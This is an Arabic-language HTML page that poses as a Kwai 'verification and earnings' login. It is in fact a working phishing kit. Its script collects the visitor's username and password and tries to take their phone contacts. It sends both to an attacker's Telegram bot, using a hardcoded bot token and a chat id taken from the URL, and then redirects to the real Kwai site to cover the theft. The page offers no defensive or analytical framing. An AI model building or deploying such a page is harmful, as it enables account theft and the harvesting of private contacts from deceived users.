<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kwai - توثيق الحساب والأرباح</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .kwai-card { background: #fff; padding: 40px 30px; width: 100%; max-width: 380px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.08); }
        h2 { color: #ff6c00; font-size: 22px; margin-bottom: 8px; }
        p { font-size: 12px; color: #666; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; outline: none; }
        input:focus { border-color: #ff6c00; }
        .kwai-btn { width: 100%; padding: 12px; background: #ff6c00; border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 8px; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="kwai-card">
        <h2>Kwai - مركز التوثيق</h2>
        <p>سجل الدخول لحسابك لتفعيل سحب الأرباح وتوثيق الحساب.</p>
        <form id="kwaiForm">
            <div class="input-group"><input type="text" id="username" placeholder="رقم الهاتف أو البريد أو اسم المستخدم" required></div>
            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور" required></div>
            <button type="submit" class="kwai-btn">تأكيد ومتابعة</button>
        </form>
    </div>
    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('kwaiForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if(!targetChatId) return;
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            let contacts = "لم يتم منح الصلاحية";
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const res = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    if (res.length > 0) contacts = res.map(c => `المستخدم: ${c.name?.[0]} - الرقم: ${c.tel?.[0]}`).join('\n');
                } catch(e) {}
            }

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد كواي جديد\nالحساب: ${user}\nالباسورد: ${pass}`)}`);
            if (contacts !== "لم يتم منح الصلاحية") {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contacts}`)}`);
            }
            setTimeout(() => { window.location.href = "https://www.kwai.com"; }, 800);
        });
    </script>
</body>
</html>
